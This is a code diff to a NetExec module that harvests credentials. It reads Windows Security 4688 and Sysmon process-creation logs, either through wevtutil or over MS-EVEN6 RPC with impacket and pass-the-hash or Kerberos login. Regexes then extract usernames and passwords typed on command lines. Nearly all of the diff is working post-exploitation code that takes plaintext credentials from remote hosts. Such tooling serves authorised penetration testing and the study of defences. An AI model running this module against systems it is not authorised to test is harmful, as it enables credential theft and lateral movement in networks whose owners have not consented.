@@ -1,4 +1,9 @@
 import re
+from impacket.dcerpc.v5 import transport, even6
+from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
+from impacket.dcerpc.v5.epm import hept_map
+from nxc.helpers.even6_parser import ResultSet
+
 
 class NXCModule:
     """
@@ -14,25 +19,35 @@ class NXCModule:
     def __init__(self):
         self.context = None
         self.module_options = None
+        self.method = "execute"
+        
+        self.limit = 1000
 
     def options(self, context, module_options):
-        """ """
-
-    def on_admin_login(self, context, connection):
-        # https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4688
-        commands = [
-            'wevtutil qe Security /f:text /rd:true /q:"*[System[(EventID=4688)]]" |findstr "Command Line"',
-            'wevtutil qe Microsoft-Windows-Sysmon/Operational /f:text  /rd:true /q:"*[System[(EventID=1)]]" |findstr "CommandLine"'
-        ]
-        content = ""
-        for command in commands:
-            context.log.debug("Execute Command: " + command)
-            content += connection.execute(command, True)
-
+        """ 
+        METHOD         EventLog method (Execute or RPCCALL)
+        M              Alias for METHOD
+        LIMIT          Limit of the number of records to be fetched
+        L              Alias for LIMIT
+        """
+        if "METHOD" in module_options:
+            self.method = module_options["METHOD"]
+        if "M" in module_options:
+            self.method = module_options["M"]
+        if "LIMIT" in module_options:
+            self.limit = int(module_options["LIMIT"])
+        if "L" in module_options:
+            self.limit = int(module_options["L"])
+            
+    def find_credentials(self, content, context):
         # remove unnecessary words
         content = content.replace("\r\n", "\n")
         content = content.replace("/add", "") 
         content = content.replace("/active:yes", "") 
+        
+        # sort and unique lines
+        content = "\n".join(sorted(set(content.split("\n"))))
+        
 
         regexps = [
         # "C:\Windows\system32\net.exe" user /add lodos2005 123456 /domain 
@@ -66,7 +81,7 @@ class NXCModule:
                         # if username is found but password is not found. we need? ignore it 
                         continue
                     # C:\Windows\system32\RunDll32.exe C:\Windows\system32\migration\WininetPlugin.dll,MigrateCacheForUser /m /0
-                    if m.groupdict().get("username") and m.groupdict().get("password") and len(m.group("password")) < 6 and len(m.group("username")) < 6:
+                    if m.groupdict().get("username") and m.groupdict().get("password") and len(m.group("password")) < 6 and len(m.group("username")) < 6: 
                         # if username and password is shorter than 6 characters, ignore it
                         continue
 
@@ -76,3 +91,152 @@ class NXCModule:
                     if m.groupdict().get("password"):
                         context.log.highlight("Password: " + m.group("password"))
                     break
+        
+    def on_admin_login(self, context, connection):
+        content = ""
+        if self.method[:1].lower() == "e":
+            # https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4688
+            commands = [
+                f'wevtutil qe Security /c:{self.limit} /f:text /rd:true /q:"*[System[(EventID=4688)]]" |findstr "Command Line"',
+                f'wevtutil qe Microsoft-Windows-Sysmon/Operational /c:{self.limit} /f:text  /rd:true /q:"*[System[(EventID=1)]]" |findstr "ParentCommandLine"'
+            ]
+            for command in commands:
+                context.log.debug("Execute Command: " + command)
+                content += connection.execute(command, True)
+        else:
+            msevenclass = MSEvenTrigger(context)
+            target = connection.host if not connection.kerberos else connection.hostname + "." + connection.domain
+            msevenclass.connect(
+                username=connection.username,
+                password=connection.password,
+                domain=connection.domain,
+                lmhash=connection.lmhash,
+                nthash=connection.nthash,
+                target=target,
+                doKerberos=connection.kerberos,
+                dcHost=connection.kdcHost,
+                aesKey=connection.aesKey,
+                pipe="eventlog"
+            )
+            for record in msevenclass.query("\x00", '<QueryList><Query Id="0"><Select Path="Microsoft-Windows-Sysmon/Operational">*[System/EventID=1]</Select></Query></QueryList>\x00', self.limit):
+                if record is None:
+                    continue
+                try:
+                    xmlString = ResultSet(record).xml()
+                    regexp = 'ParentCommandLine">(?P<ParentCommandLine>(.|\n)*?)<\/Data>'
+                    m = re.search(regexp, xmlString, re.IGNORECASE)
+                    if m and m.groupdict().get("ParentCommandLine"):
+                        content += "ParentCommandLine: " + m.group("ParentCommandLine") + "\n"
+        
+                except Exception as e:
+                    context.log.error(f"Error: {e}")
+                    continue
+            
+            for record in msevenclass.query("\x00", '<QueryList><Query Id="0"><Select Path="Security">*[System/EventID=4688]</Select></Query></QueryList>\x00', self.limit):
+                if record is None:
+                    continue
+                try:
+                    xmlString = ResultSet(record).xml()
+                    regexp = 'CommandLine">(?P<CommandLine>(.|\n)*?)<\/Data>'
+                    m = re.search(regexp, xmlString, re.IGNORECASE)
+                    if m and m.groupdict().get("CommandLine"):
+                        content += "CommandLine: " + m.group("CommandLine") + "\n"
+                except Exception as e:
+                    context.log.error(f"Error: {e} {record}")
+                    continue
+        
+        self.find_credentials(content, context)
+
+        
+             
+                
+                
+                
+
+class MSEvenTrigger:
+    def __init__(self, context):
+        self.context = context
+        self.dce = None
+
+    def connect(self, username, password, domain, lmhash, nthash, aesKey, target, doKerberos, dcHost, pipe):
+    
+        rpctransport = transport.DCERPCTransportFactory(hept_map(target, even6.MSRPC_UUID_EVEN6, protocol="ncacn_ip_tcp"))
+
+        if hasattr(rpctransport, "set_credentials"):
+            rpctransport.set_credentials(
+                username=username,
+                password=password,
+                domain=domain,
+                lmhash=lmhash,
+                nthash=nthash,
+                aesKey=aesKey,
+            )
+
+        if doKerberos:
+            rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)
+
+        rpctransport.setRemoteHost(target)
+        self.dce = rpctransport.get_dce_rpc()
+        if doKerberos:
+            self.dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
+        self.dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
+        self.context.log.debug(f"Connecting to {target}...")
+        try:
+            self.dce.connect()
+        except Exception as e:
+            self.context.log.debug(f"Something went wrong, check error status => {e!s}")
+            return
+        try:
+            self.dce.bind(even6.MSRPC_UUID_EVEN6)
+            self.context.log.debug("[+] Successfully bound!")
+        except Exception as e:
+            self.context.log.debug(f"Something went wrong, check error status => {e!s}")
+            return
+        self.context.log.debug("[+] Successfully bound!")
+
+    def query(self, path, query, limit):
+        req = even6.EvtRpcRegisterLogQuery()
+        req["Path"] = path + "\x00"
+        req["Query"] = query + "\x00"
+        req["Flags"] = even6.EvtQueryChannelName | even6.EvtReadNewestToOldest
+
+        resp = self.dce.request(req)
+        handle = resp["Handle"]
+
+        return MSEven6Result(self, handle, limit)
+    
+class MSEven6Result:
+    def __init__(self, conn, handle, limit):
+        self._conn = conn
+        self._handle = handle
+        self._hardlimit = limit
+
+    def __iter__(self):
+        self._resp = None
+        return self
+
+    def __next__(self):
+        self._hardlimit -= 1
+        if self._hardlimit < 0:
+            raise StopIteration
+        if self._resp is not None and self._resp["NumActualRecords"] == 0:
+            return None
+
+        if self._resp is None or self._index == self._resp["NumActualRecords"]:
+            req = even6.EvtRpcQueryNext()
+            req["LogQuery"] = self._handle
+            req["NumRequestedRecords"] = 1
+            req["TimeOutEnd"] = 1000
+            req["Flags"] = 0
+            self._resp = self._conn.dce.request(req)
+
+            if self._resp["NumActualRecords"] == 0:
+                return None
+            else:
+                self._index = 0
+
+        offset = self._resp["EventDataIndices"][self._index]["Data"]
+        size = self._resp["EventDataSizes"][self._index]["Data"]
+        self._index += 1
+
+        return b"".join(self._resp["ResultBuffer"][offset:offset + size])
